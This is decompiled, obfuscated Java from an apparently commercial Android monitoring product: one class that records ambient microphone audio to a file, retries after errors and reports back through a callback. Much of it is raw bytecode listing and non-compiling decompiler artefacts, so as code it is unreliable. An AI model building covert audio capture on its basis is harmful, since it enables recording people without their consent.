package com.vvt.a;

import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;

public class d
  implements MediaRecorder.OnErrorListener, MediaRecorder.OnInfoListener, a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private MediaRecorder d;
  private boolean e;
  private c f;
  private String g;
  private int h;
  private int i = 0;
  
  private void a(String paramString, int paramInt1, int paramInt2)
  {
    int j = 1;
    MediaRecorder localMediaRecorder = new android/media/MediaRecorder;
    localMediaRecorder.<init>();
    this.d = localMediaRecorder;
    this.d.setAudioSource(j);
    this.d.setOutputFormat(j);
    this.d.setAudioEncoder(j);
    this.d.setAudioChannels(paramInt2);
    this.d.setMaxDuration(paramInt1);
    this.d.setOnErrorListener(this);
    this.d.setOnInfoListener(this);
    this.d.setOutputFile(paramString);
    this.d.prepare();
    this.d.start();
  }
  
  public void a(boolean paramBoolean)
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = a;
      if (bool) {}
      Object localObject = this.d;
      if (localObject != null)
      {
        this.d.stop();
        localObject = this.d;
        ((MediaRecorder)localObject).release();
        this.d = null;
        bool = false;
        this.e = false;
        localObject = this.f;
        if ((localObject != null) && (paramBoolean))
        {
          localObject = this.f;
          String str = this.g;
          ((c)localObject).b(str);
        }
        this.f = null;
      }
    }
    for (;;)
    {
      return;
      bool = b;
      if (!bool) {
        break;
      }
      break;
      bool = a;
      if (!bool) {}
    }
  }
  
  public boolean a()
  {
    boolean bool = a;
    if (bool) {}
    return this.e;
  }
  
  /* Error */
  public boolean a(String paramString1, String paramString2, int paramInt, c paramc)
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: aload_0
    //   3: getfield 84	com/vvt/a/d:e	Z
    //   6: istore 5
    //   8: iload 5
    //   10: ifne +166 -> 176
    //   13: aload_0
    //   14: aload_2
    //   15: putfield 94	com/vvt/a/d:FxFileObserverWorker	Ljava/lang/String;
    //   18: aload_0
    //   19: iload_3
    //   20: putfield 100	com/vvt/a/d:AppEngine1	I
    //   23: aload_0
    //   24: aload 4
    //   26: putfield 92	com/vvt/a/d:f	Lcom/vvt/a/MyUncaughtExceptionHandler;
    //   29: iconst_0
    //   30: istore 5
    //   32: aconst_null
    //   33: astore 6
    //   35: aload_0
    //   36: iconst_0
    //   37: putfield 43	com/vvt/a/d:i	I
    //   40: getstatic 29	com/vvt/a/d:a	Z
    //   43: istore 5
    //   45: iload 5
    //   47: ifeq +3 -> 50
    //   50: aload_0
    //   51: getfield 94	com/vvt/a/d:FxFileObserverWorker	Ljava/lang/String;
    //   54: astore 6
    //   56: aload_0
    //   57: getfield 100	com/vvt/a/d:AppEngine1	I
    //   60: istore 7
    //   62: iconst_2
    //   63: istore 8
    //   65: aload_0
    //   66: aload 6
    //   68: iload 7
    //   70: iload 8
    //   72: invokespecial 104	com/vvt/a/d:a	(Ljava/lang/String;II)V
    //   75: iconst_1
    //   76: istore 5
    //   78: aload_0
    //   79: iload 5
    //   81: putfield 84	com/vvt/a/d:e	Z
    //   84: aload_0
    //   85: getfield 84	com/vvt/a/d:e	Z
    //   88: istore 5
    //   90: aload_0
    //   91: monitorexit
    //   92: iload 5
    //   94: ireturn
    //   95: astore 6
    //   97: getstatic 37	com/vvt/a/d:MyUncaughtExceptionHandler	Z
    //   100: istore 5
    //   102: iload 5
    //   104: ifeq +3 -> 107
    //   107: iconst_0
    //   108: istore 5
    //   110: aconst_null
    //   111: astore 6
    //   113: aload_0
    //   114: aconst_null
    //   115: putfield 94	com/vvt/a/d:FxFileObserverWorker	Ljava/lang/String;
    //   118: iconst_0
    //   119: istore 5
    //   121: aconst_null
    //   122: astore 6
    //   124: aload_0
    //   125: iconst_0
    //   126: putfield 84	com/vvt/a/d:e	Z
    //   129: goto -45 -> 84
    //   132: astore 6
    //   134: aload_0
    //   135: monitorexit
    //   136: aload 6
    //   138: athrow
    //   139: astore 6
    //   141: getstatic 37	com/vvt/a/d:MyUncaughtExceptionHandler	Z
    //   144: istore 5
    //   146: iload 5
    //   148: ifeq +3 -> 151
    //   151: iconst_0
    //   152: istore 5
    //   154: aconst_null
    //   155: astore 6
    //   157: aload_0
    //   158: aconst_null
    //   159: putfield 94	com/vvt/a/d:FxFileObserverWorker	Ljava/lang/String;
    //   162: iconst_0
    //   163: istore 5
    //   165: aconst_null
    //   166: astore 6
    //   168: aload_0
    //   169: iconst_0
    //   170: putfield 84	com/vvt/a/d:e	Z
    //   173: goto -89 -> 84
    //   176: ldc 106
    //   178: astore 6
    //   180: getstatic 33	com/vvt/a/d:removeFromPath	Z
    //   183: istore 7
    //   185: iload 7
    //   187: ifeq +3 -> 190
    //   190: new 108	java/lang/IllegalStateException
    //   193: astore 9
    //   195: aload 9
    //   197: aload 6
    //   199: invokespecial 110	java/lang/IllegalStateException:<init>	(Ljava/lang/String;)V
    //   202: aload 9
    //   204: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	205	0	this	d
    //   0	205	1	paramString1	String
    //   0	205	2	paramString2	String
    //   0	205	3	paramInt	int
    //   0	205	4	paramc	MyUncaughtExceptionHandler
    //   6	158	5	bool1	boolean
    //   33	34	6	str1	String
    //   95	1	6	localIllegalStateException1	IllegalStateException
    //   111	12	6	localObject1	Object
    //   132	5	6	localObject2	Object
    //   139	1	6	localIOException	java.io.IOException
    //   155	43	6	str2	String
    //   60	9	7	j	int
    //   183	3	7	bool2	boolean
    //   63	8	8	k	int
    //   193	10	9	localIllegalStateException2	IllegalStateException
    // Exception table:
    //   from	to	target	type
    //   50	54	95	java/lang/IllegalStateException
    //   56	60	95	java/lang/IllegalStateException
    //   70	75	95	java/lang/IllegalStateException
    //   79	84	95	java/lang/IllegalStateException
    //   2	6	132	finally
    //   14	18	132	finally
    //   19	23	132	finally
    //   24	29	132	finally
    //   36	40	132	finally
    //   40	43	132	finally
    //   50	54	132	finally
    //   56	60	132	finally
    //   70	75	132	finally
    //   79	84	132	finally
    //   84	88	132	finally
    //   97	100	132	finally
    //   114	118	132	finally
    //   125	129	132	finally
    //   141	144	132	finally
    //   158	162	132	finally
    //   169	173	132	finally
    //   180	183	132	finally
    //   190	193	132	finally
    //   197	202	132	finally
    //   202	205	132	finally
    //   50	54	139	java/io/IOException
    //   56	60	139	java/io/IOException
    //   70	75	139	java/io/IOException
    //   79	84	139	java/io/IOException
  }
  
  public void onError(MediaRecorder paramMediaRecorder, int paramInt1, int paramInt2)
  {
    int j = 1;
    boolean bool1 = c;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    bool1 = false;
    this.e = false;
    Object localObject = this.d;
    if (localObject != null)
    {
      this.d.reset();
      this.d.release();
      bool1 = false;
      localObject = null;
      this.d = null;
    }
    int k = this.i;
    if (k > j)
    {
      localObject = this.f;
      if (localObject != null)
      {
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        localObject = "Ambient Recorder error: " + paramInt1 + ", extra code: " + paramInt2;
        c localc = this.f;
        localc.a((String)localObject);
      }
    }
    for (;;)
    {
      k = this.i + 1;
      this.i = k;
      return;
      boolean bool2;
      try
      {
        localObject = this.g;
        j = this.h;
        int m = 1;
        a((String)localObject, j, m);
      }
      catch (Exception localException)
      {
        bool2 = c;
      }
      if (!bool2) {}
    }
  }
  
  public void onInfo(MediaRecorder paramMediaRecorder, int paramInt1, int paramInt2)
  {
    boolean bool1 = a;
    if (bool1) {}
    int j = 800;
    if (paramInt1 == j)
    {
      boolean bool2 = a;
      if (bool2) {}
      Object localObject = this.d;
      if (localObject != null)
      {
        this.d.stop();
        this.d.release();
        bool2 = false;
        localObject = null;
        this.d = null;
      }
      bool2 = false;
      this.e = false;
      localObject = this.f;
      if (localObject != null)
      {
        localObject = this.f;
        String str = this.g;
        ((c)localObject).b(str);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */